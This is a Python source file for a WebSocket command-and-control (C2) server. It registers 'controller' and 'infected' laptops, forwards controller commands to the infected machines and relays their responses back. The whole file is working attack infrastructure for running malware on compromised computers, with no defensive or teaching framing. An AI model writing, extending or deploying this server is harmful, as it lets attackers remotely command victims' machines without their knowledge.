import asyncio
import websockets
import json
import uuid
import logging
import socket
from datetime import datetime, timedelta

# Configure logging
logging.basicConfig(level=logging.DEBUG, format="%(asctime)s [%(levelname)s] %(message)s")

# Store connected computers and messages
clients = {}
messages = []

# Message retention time (1 day)
MESSAGE_RETENTION_PERIOD = timedelta(days=1)


# Utility function to clean up old messages
def cleanup_old_messages():
    global messages
    cutoff = datetime.now() - MESSAGE_RETENTION_PERIOD
    messages[:] = [msg for msg in messages if msg['command_time'] > cutoff]
    logging.debug(f"Cleaned up messages. Remaining messages: {len(messages)}")


# Assign a unique ID to each new connection
async def register_client(websocket, role, client_id):
    clients[client_id] = {
        'websocket': websocket,
        'last_seen': datetime.now(),
        'role': role,  # Store the role (controller or infected)
        'messages': []  # For storing unsent messages
    }
    logging.debug(f"Registered new {role}: {client_id}")
    return client_id


# Relay messages between control and infected laptops
async def relay_messages(websocket, client_id, role):
    while True:
        try:
            # Receive message from the client
            message = await websocket.recv()
            data = json.loads(message)
            logging.debug(f"Received message from {client_id} ({role}): {data}")

            cleanup_old_messages()  # Clean up old messages before processing new ones

            if data.get("type") == "command" and role == "controller":
                # Controller sends a command to an infected laptop
                target_id = data['target']
                command = data['command']
                command_type = data['command_type']

                logging.debug(f"Processing command for target {target_id}: {command}")

                if target_id in clients and clients[target_id]['role'] == 'infected':
                    target_ws = clients[target_id]['websocket']
                    command_id = str(uuid.uuid4())
                    command_time = datetime.now()

                    new_message = {
                        'id': command_id,
                        'origin': client_id,
                        'target': target_id,
                        'command_time': command_time,
                        'response_time': None,
                        'type': command_type,
                        'command': command,
                        'response': None
                    }

                    # Send the command to the target
                    await target_ws.send(json.dumps(new_message))
                    messages.append(new_message)  # Log the message
                    logging.debug(f"Command sent to target {target_id}: {new_message}")

                else:
                    # If the target is not available, queue the message
                    clients[client_id]['messages'].append(data)
                    logging.debug(f"Client {target_id} is not connected. Command queued.")

            elif data.get("type") == "response" and role == "infected":
                # Infected laptop sends a response back to the controller
                command_id = data['command_id']
                response = data['response']

                logging.debug(f"Processing response for command ID {command_id}: {response}")

                # Find the original command and update it with the response
                for msg in messages:
                    if msg['id'] == command_id:
                        msg['response'] = response
                        msg['response_time'] = datetime.now()
                        logging.debug(f"Updated message with response: {msg}")
                        break

                # Relay the response back to the originating client (controller)
                origin_id = msg['origin']
                if origin_id in clients:
                    origin_ws = clients[origin_id]['websocket']
                    await origin_ws.send(json.dumps(msg))
                    logging.debug(f"Response relayed to origin {origin_id}: {msg}")

        except websockets.ConnectionClosed:
            logging.info(f"Client {client_id} ({role}) disconnected.")
            del clients[client_id]
            break
        except Exception as e:
            logging.error(f"Exception occurred: {e}", exc_info=True)


# Handle new connections
async def connection_handler(websocket, path):
    client_id = None  # Initialize client_id to None
    try:
        # First message must specify the role and client ID
        initial_message = await websocket.recv()
        initial_data = json.loads(initial_message)

        role = initial_data['role']
        client_id = initial_data['id']  # Assign client_id after parsing the initial message

        await register_client(websocket, role, client_id)
        logging.info(f"New {role} connected: {client_id}")

        await relay_messages(websocket, client_id, role)
    except websockets.ConnectionClosed:
        logging.info(f"Connection closed for client: {client_id if client_id else 'unknown client'}")
        if client_id in clients:
            del clients[client_id]
    except Exception as e:
        logging.error(f"Exception occurred in connection handler: {e}", exc_info=True)


# Function to get the local IP address of the server
def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # Doesn't actually send data, just connects to determine the IP address
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = "127.0.0.1"  # Fallback to localhost if something goes wrong
    finally:
        s.close()
    return ip


# Start the WebSocket server
async def main():
    ip_address = get_local_ip()  # Retrieve the IP address
    port = 5000  # Define the port

    logging.info(f"Server listening on 0.0.0.0:{port}")
    logging.info(f"Server at {ip_address}:{port}")

    async with websockets.serve(connection_handler, "0.0.0.0", port):
        logging.debug("C2 WebSocket server is running...")
        await asyncio.Future()  # Run forever


if __name__ == "__main__":
    asyncio.run(main())
